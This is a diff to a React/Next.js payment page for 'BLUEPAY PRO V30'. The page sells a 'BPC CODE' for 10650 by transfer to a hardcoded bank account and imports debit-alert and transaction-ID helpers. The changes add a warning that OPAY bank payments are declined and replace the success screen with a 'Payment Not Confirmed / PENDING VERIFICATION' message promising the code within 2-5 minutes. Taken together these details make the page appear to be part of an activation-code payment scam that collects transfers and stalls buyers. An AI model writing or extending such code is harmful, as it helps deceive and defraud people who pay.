@@ -4,6 +4,7 @@ import { useState, useEffect } from 'react'
 import { useRouter } from 'next/navigation'
 import { ArrowLeft, CheckCircle, AlertCircle, Upload, Loader, Copy, Check, Mail } from 'lucide-react'
 import { Countdown } from '@/components/Countdown'
+import WarningNotification from '@/components/WarningNotification'
 import { createClient } from '@supabase/supabase-js'
 import { sendBPCEmail, formatDateTimeForEmail } from '@/lib/email-service'
 import { sendDebitAlert, generateTransactionId, getCurrentDateTime } from '@/lib/debit-alert'
@@ -21,6 +22,7 @@ export default function BuyBPCPage() {
   const [sessionId, setSessionId] = useState('')
   const [currentDateTime, setCurrentDateTime] = useState('')
   const [copiedField, setCopiedField] = useState<string | null>(null)
+  const [showWarningNotification, setShowWarningNotification] = useState(false)
 
   const BPC_PRICE = 10650
   const ACCOUNT_NUMBER = '6711230988'
@@ -408,6 +410,13 @@ export default function BuyBPCPage() {
         )}
 
         {step === 'warning' && (
+          <>
+            <WarningNotification
+              isOpen={true}
+              onClose={() => setShowWarningNotification(false)}
+              title="WARNING - OPAY NOT SUPPORTED"
+              message="Dear BLUEPAY PRO V30 user, making payment via OPAY BANK is not available. Any payment made via OPAY BANK will be declined due to our terms and service. Kindly proceed with other banks."
+            />
           <div className="space-y-3">
             <div className="flex justify-center mb-3">
               <img 
@@ -448,6 +457,7 @@ export default function BuyBPCPage() {
               </button>
             </div>
           </div>
+          </>
         )}
 
         {step === 'receipt_countdown' && (
@@ -468,26 +478,29 @@ export default function BuyBPCPage() {
 
         {step === 'success' && (
           <>
-            <div className="bg-gradient-to-b from-green-50 to-blue-50 rounded-2xl p-5 text-center mb-4">
+            <div className="bg-gradient-to-b from-yellow-50 to-orange-50 rounded-2xl p-5 text-center mb-4">
               <div className="flex justify-center mb-4">
-                <CheckCircle className="w-16 h-16 text-green-600" />
+                <AlertCircle className="w-16 h-16 text-yellow-600" />
               </div>
               
-              <h2 className="text-2xl font-bold text-gray-900 mb-1">Order Successfully</h2>
-              <h3 className="text-base font-semibold text-green-600 mb-5">Received</h3>
+              <h2 className="text-2xl font-bold text-gray-900 mb-1">Payment Not</h2>
+              <h3 className="text-base font-semibold text-yellow-600 mb-5">Confirmed</h3>
               
               {/* Main Message */}
-              <div className="mb-6 text-left bg-white rounded-xl p-4 border border-blue-200">
-                <p className="text-sm font-bold text-gray-900 mb-3">
-                  Dear Valued Customer,
+              <div className="mb-6 text-left bg-yellow-50 rounded-xl p-4 border-2 border-yellow-200">
+                <p className="text-sm font-bold text-yellow-900 mb-3">
+                  ⚠️ Payment Pending Confirmation
                 </p>
-                <p className="text-sm text-gray-700 leading-relaxed mb-3">
-                  Kindly be informed that your payment is currently under review. Once the verification process is completed successfully, your BPC CODE generation details will be sent directly to your registered email address.
+                <p className="text-sm text-yellow-800 leading-relaxed mb-3">
+                  Your payment is still being verified. We are currently processing your transaction. Please do not make duplicate payments.
                 </p>
-                <p className="text-sm text-gray-700 leading-relaxed">
-                  We appreciate your patience and understanding.
+                <p className="text-sm text-yellow-800 leading-relaxed font-semibold mb-3">
+                  Status: PENDING VERIFICATION
                 </p>
-                <p className="text-sm font-semibold text-gray-900 mt-4 pt-3 border-t border-gray-200">
+                <p className="text-xs text-yellow-700 leading-relaxed">
+                  You will receive an email notification with your BPC CODE details once verification is complete. This typically takes 2-5 minutes.
+                </p>
+                <p className="text-sm font-semibold text-yellow-900 mt-4 pt-3 border-t border-yellow-300">
                   BLUEPAY Support Team
                 </p>
               </div>
